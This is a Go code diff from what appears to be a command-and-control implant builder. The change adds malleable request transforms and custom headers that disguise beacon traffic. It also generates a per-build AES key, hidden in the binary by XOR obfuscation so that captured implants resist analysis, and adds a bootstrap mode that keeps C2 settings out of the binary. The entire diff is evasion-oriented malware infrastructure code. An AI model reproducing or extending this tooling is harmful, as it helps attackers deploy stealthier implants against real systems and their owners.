@@ -54,21 +54,43 @@ type agentConfigJSON struct {
 	SelfCheckSHA256  string `json:"self_check"`
 	MalleablePrepend string `json:"malleable_prepend"`
 	MalleableAppend  string `json:"malleable_append"`
+	// Request-side transforms (applied by the agent to outbound beacons).
+	MalleableRequestPrepend string            `json:"malleable_request_prepend"`
+	MalleableRequestAppend  string            `json:"malleable_request_append"`
+	MalleableRequestHeaders map[string]string `json:"malleable_request_headers"`
 }
 
-// configBlobKeyHex is the AES-256 key material (64 hex chars) shared with the
-// agent. The agent binary only ever carries it through the strxor table
-// (SConfigKey, re-encoded with a fresh XOR key every build), so the plaintext
-// key never appears in the delivered binary — only in this builder source.
-const configBlobKeyHex = "947ce1b2f693c5a0f79e7ab52674948b9e4fbc7ff39ae4021d98612e07d05a96"
+// randomAESKey returns 32 random bytes suitable for AES-256.
+func randomAESKey() []byte {
+	key := make([]byte, 32)
+	if _, err := rand.Read(key); err != nil {
+		return nil
+	}
+	return key
+}
 
-// obfuscateBlob encrypts the config blob with AES-256-GCM using the shared
-// builder key. Format: base64(nonce || ciphertext || tag). Unlike the old XOR
-// scheme (where the key travelled alongside the data in the blob) the cipher
-// is authenticated and the key is not recoverable from the blob alone.
-func obfuscateBlob(plaintext []byte) string {
-	key, err := hex.DecodeString(configBlobKeyHex)
-	if err != nil {
+// strxorEncode obfuscates a plaintext string the same way the agent's strxor
+// table works (random XOR key, emitted as "<hexkey>:<base64(cipher)>"). The
+// agent recovers it with mustDecrypt/s. We use this to deliver a per-build
+// config-blob AES key via -ldflags -X main.SConfigKey without ever writing the
+// plaintext key into source or the delivered binary in recoverable form.
+func strxorEncode(plaintext string) string {
+	key := make([]byte, len(plaintext))
+	if _, err := rand.Read(key); err != nil {
+		return ""
+	}
+	enc := make([]byte, len(plaintext))
+	for i := range plaintext {
+		enc[i] = plaintext[i] ^ key[i]
+	}
+	return hex.EncodeToString(key) + ":" + base64.StdEncoding.EncodeToString(enc)
+}
+
+// obfuscateBlobKeyed encrypts the config blob with AES-256-GCM using the supplied
+// 32-byte key. Format: base64(nonce || ciphertext || tag). The cipher is
+// authenticated and the key is not recoverable from the blob alone.
+func obfuscateBlobKeyed(plaintext, key []byte) string {
+	if len(key) != 32 {
 		return ""
 	}
 	block, err := aes.NewCipher(key)
@@ -87,9 +109,44 @@ func obfuscateBlob(plaintext []byte) string {
 	return base64.StdEncoding.EncodeToString(sealed)
 }
 
-// buildConfigBlob serializes the resolved implant configuration into the
+// obfuscateBlobKeyed is the only supported config-blob encryption: a fresh
+// per-build AES-256 key (see buildConfigBlobKeyed). The static/shared-key path
+// was removed so no fleet-wide constant key can ever appear in source or be
+// recovered from a delivered binary.
+
+// buildConfigBlobKeyed serializes the resolved implant configuration into the
 // obfuscated runtime config block that the agent decodes during init().
-func buildConfigBlob(cfg ImplantConfig, profile MalleableProfile) string {
+func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
+	// Bootstrap-only compile: embed only what the agent needs to reach the
+	// server and register — its per-implant secret plus the initial C2
+	// endpoint. The full network config is then delivered over the wire at
+	// registration (encrypted under the same secret), so no operational
+	// parameters are burned into the binary.
+	if cfg.NetworkConfigOverWire {
+		transport := cfg.BeaconTransport
+		if transport == "" {
+			transport = cfg.Protocol
+		}
+		if transport == "" {
+			transport = "http"
+		}
+		bc := agentConfigJSON{
+			C2URL:                  cfg.C2URL,
+			Protocol:               cfg.Protocol,
+			BeaconTransport:        transport,
+			RegSecretID:            cfg.RegSecretID,
+			RegSecret:              cfg.RegSecret,
+			MalleableRequestPrepend: cfg.MalleableRequestPrepend,
+			MalleableRequestAppend:  cfg.MalleableRequestAppend,
+			MalleableRequestHeaders: cfg.MalleableRequestHeaders,
+		}
+		raw, err := json.Marshal(bc)
+		if err != nil {
+			return nil
+		}
+		return raw
+	}
+
 	persistStr := "false"
 	if cfg.Persist {
 		persistStr = "true"
@@ -160,10 +217,29 @@ func buildConfigBlob(cfg ImplantConfig, profile MalleableProfile) string {
 		SelfCheckSHA256:  cfg.SelfCheckSHA256,
 		MalleablePrepend: cfg.MalleablePrepend,
 		MalleableAppend:  cfg.MalleableAppend,
+		MalleableRequestPrepend: cfg.MalleableRequestPrepend,
+		MalleableRequestAppend:  cfg.MalleableRequestAppend,
+		MalleableRequestHeaders: cfg.MalleableRequestHeaders,
 	}
 	raw, err := json.Marshal(bc)
 	if err != nil {
-		return ""
+		return nil
 	}
-	return obfuscateBlob(raw)
+	return raw
+}
+
+// buildConfigBlobKeyed produces the obfuscated config blob and the strxor-encoded
+// per-build AES key to inject via -X main.SConfigKey. Each build gets a unique
+// key, so a captured blob from one implant cannot be decrypted with another
+// implant's key (eliminating the fleet-wide shared constant).
+func buildConfigBlobKeyed(cfg ImplantConfig, profile MalleableProfile) (blob string, sConfigKey string) {
+	raw := marshalConfigBlobJSON(cfg, profile)
+	if raw == nil {
+		return "", ""
+	}
+	key := randomAESKey()
+	if key == nil {
+		return "", ""
+	}
+	return obfuscateBlobKeyed(raw, key), strxorEncode(hex.EncodeToString(key))
 }
